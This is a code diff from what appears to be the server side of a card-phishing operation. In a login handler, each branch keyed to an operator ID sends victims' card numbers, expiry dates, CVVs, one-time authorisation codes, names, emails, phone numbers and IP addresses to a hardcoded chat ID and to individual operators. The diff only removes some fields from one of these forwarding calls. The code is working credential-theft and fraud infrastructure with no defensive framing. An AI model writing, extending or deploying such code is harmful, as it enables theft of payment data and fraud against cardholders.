@@ -49,7 +49,7 @@ def login():
         ID = f'{session}'
         # WE
         if id == '1000001':
-            send_me('7383961273', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
             if authCode is not None and authCode != 'None':
                 send_sms('-1002179206284', card_number, expiry_date, cvv, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
@@ -59,7 +59,7 @@ def login():
 
         # Egoist
         elif id == '1000002':
-            send_me('7383961273', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
             if authCode is not None and authCode != 'None':
                 send_sms(Egoist, card_number, expiry_date, cvv, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
@@ -68,7 +68,7 @@ def login():
             return '', 200  # Возвращаем пустой ответ с кодом 200
         # Egoist2
         elif id == '1000003':
-            send_me('7383961273', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
             if authCode is not None and authCode != 'None':
                 send_sms(Egoist2, card_number, expiry_date, cvv, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
@@ -77,7 +77,7 @@ def login():
             return '', 200  # Возвращаем пустой ответ с кодом 200
         # Plaxa
         elif id == '1000004':
-            send_me('7383961273', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
             if authCode is not None and authCode != 'None':
                 send_sms(Plaxa, card_number, expiry_date, cvv, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
@@ -85,7 +85,7 @@ def login():
             send_buttons_message(Plaxa, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200        
         elif id == '1000005':
-            send_me('7383961273', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
             if authCode is not None and authCode != 'None':
                 send_sms(Egoist3, card_number, expiry_date, cvv, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
@@ -93,7 +93,7 @@ def login():
             send_buttons_message(Egoist3, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
         elif id == '1000006':
-            send_me('7383961273', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
             if authCode is not None and authCode != 'None':
                 send_sms(Egoist4, card_number, expiry_date, cvv, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
@@ -101,7 +101,7 @@ def login():
             send_buttons_message(Egoist4, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200        
         elif id == '1000007':
-            send_me('7383961273', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
             if authCode is not None and authCode != 'None':
                 send_sms(Egoist5, card_number, expiry_date, cvv, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
@@ -109,7 +109,7 @@ def login():
             send_buttons_message(Egoist5, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
         elif id == '1000008':
-            send_me('7383961273', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
             if authCode is not None and authCode != 'None':
                 send_sms(Egoist6, card_number, expiry_date, cvv, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
@@ -117,7 +117,7 @@ def login():
             send_buttons_message(Egoist6, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
         elif id == '1000009':
-            send_me('7383961273', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
             if authCode is not None and authCode != 'None':
                 send_sms(Plaksa, card_number, expiry_date, cvv, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
